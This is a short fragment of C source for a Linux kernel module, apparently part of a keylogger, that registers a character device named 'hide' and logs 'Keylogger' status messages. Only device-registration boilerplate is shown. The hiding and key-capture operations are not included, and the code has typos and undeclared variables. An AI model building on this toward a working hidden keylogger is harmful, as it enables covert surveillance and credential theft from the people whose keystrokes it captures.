#include "module.h"
static int hide_driver_entery(void)
{
    ret = alloc_chrdev_region(&dev_num1, 0, 1, "hide");
    if (ret < 0)
    {
        printk(KERN_ALERT "Keylogger: failed to allocate a major number for hide");
        return ret;
    }
    major_number = MAJOR(dev_num1);
    mcdev1 = cdev_alloc();
    mcdev1->ops = &fops_hide;
    mcdev1->owner = THIS_MODULE;
    ret = cdev_add(mcdev1, dev_num1, 1);
    if (ret < 0)
    {
        printk(KERN_ALERT "kelogger: unable to add hide cdev to kernel");
        return -1;
    }
    sema_init(&virtual_device1.sem, 1);
    return 0;
}
static int start_hide(void)
{
    ret = hide_driver_entery();
    if (ret == -1)
    {
        printk(KERN_ALERT "Keylogger: unbale to load the module -> driver entry");
        return ret;
    }
    else
    {
        printk(KERN_ALERT "Keylogger: load the device driver successfully");
    }
    return 1;
}